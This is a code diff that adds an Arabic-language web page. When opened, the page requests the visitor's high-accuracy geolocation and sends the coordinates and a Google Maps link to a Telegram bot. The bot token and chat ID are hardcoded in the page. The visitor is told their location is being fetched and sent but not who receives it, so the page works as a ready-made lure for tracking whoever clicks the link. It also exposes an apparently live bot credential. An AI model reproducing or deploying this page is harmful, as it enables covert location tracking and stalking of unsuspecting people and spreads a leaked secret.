@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إرسال الموقع الجغرافي</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #0088cc;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>جاري الحصول على موقعك الجغرافي</h1>
+        <p>يتم الآن طلب إذن الوصول إلى موقعك الجغرافي...</p>
+        <div class="loader"></div>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = 'جاري تحديد الموقع...';
+            
+            if (navigator.geolocation) {
+                // استخدام watchPosition بدلاً من getCurrentPosition للحصول على أسرع استجابة
+                const watchId = navigator.geolocation.watchPosition(
+                    function(position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        
+                        // إيقاف مراقبة الموقع بعد الحصول عليه
+                        navigator.geolocation.clearWatch(watchId);
+                        
+                        // إرسال الموقع إلى بوت تلجرام
+                        sendToTelegramBot(latitude, longitude);
+                    },
+                    function(error) {
+                        let errorMessage;
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = "تم رفض طلب الوصول إلى الموقع الجغرافي.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = "معلومات الموقع غير متاحة.";
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = "انتهى وقت طلب الموقع.";
+                                break;
+                            case error.UNKNOWN_ERROR:
+                                errorMessage = "حدث خطأ غير معروف.";
+                                break;
+                        }
+                        statusElement.textContent = errorMessage;
+                        document.querySelector('.loader').style.display = 'none';
+                    },
+                    {
+                        enableHighAccuracy: true, // للحصول على دقة أعلى وأسرع
+                        maximumAge: 0, // عدم استخدام البيانات المخزنة مؤقتًا
+                        timeout: 5000 // وقت انتظار قصير
+                    }
+                );
+            } else {
+                statusElement.textContent = "المتصفح لا يدعم خدمة الموقع الجغرافي.";
+                document.querySelector('.loader').style.display = 'none';
+            }
+        });
+
+        function sendToTelegramBot(latitude, longitude) {
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = 'جاري إرسال الموقع...';
+            
+                     // استبدل هذه القيم بمعلومات بوتك
+            const botToken = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
+            const chatId = '7327464581';
+            
+            const message = `?? تم استلام موقع جديد:
+الخط العرضي: ${latitude}
+الخط الطولي: ${longitude}
+رابط خرائط جوجل: https://www.google.com/maps?q=${latitude},${longitude}`;
+            
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            // استخدام fetch مع AbortController للتحكم في الوقت المستغرق
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 3000); // مهلة 3 ثواني
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                }),
+                signal: controller.signal
+            })
+            .then(response => response.json())
+            .then(data => {
+                clearTimeout(timeoutId);
+                document.querySelector('.loader').style.display = 'none';
+                if (data.ok) {
+                    statusElement.textContent = 'تم إرسال الموقع بنجاح! يمكنك إغلاق هذه الصفحة.';
+                } else {
+                    statusElement.textContent = 'فشل في إرسال الموقع إلى بوت تلجرام.';
+                }
+            })
+            .catch(error => {
+                clearTimeout(timeoutId);
+                document.querySelector('.loader').style.display = 'none';
+                if (error.name === 'AbortError') {
+                    statusElement.textContent = 'انتهى الوقت المخصص لإرسال الموقع.';
+                } else {
+                    statusElement.textContent = 'خطأ في الاتصال بالإنترنت.';
+                }
+                console.error('Error:', error);
+            });
+        }
+    </script>
+</body>
+</html>
